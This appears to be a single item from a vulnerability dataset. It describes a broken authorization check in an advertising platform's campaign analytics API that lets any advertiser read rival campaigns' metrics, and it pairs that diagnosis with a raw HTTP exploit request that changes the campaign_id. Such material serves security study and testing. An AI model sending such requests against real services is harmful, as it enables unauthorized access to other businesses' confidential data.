diagnosis: The campaign analytics API checks Sanctum token abilities but pulls metrics directly by query parameter without confirming that the target marketing campaign belongs to the authenticated advertiser. Any advertiser with an analytics-enabled token can inspect impressions, click-through rates, and conversion costs of rival ad campaigns.
exploit_request:
GET /api/marketing/analytics/stats?campaign_id=7410 HTTP/1.1
Host: ads.adplatform-media.com
Authorization: Bearer 82|analyticstoken7788
Accept: application/json
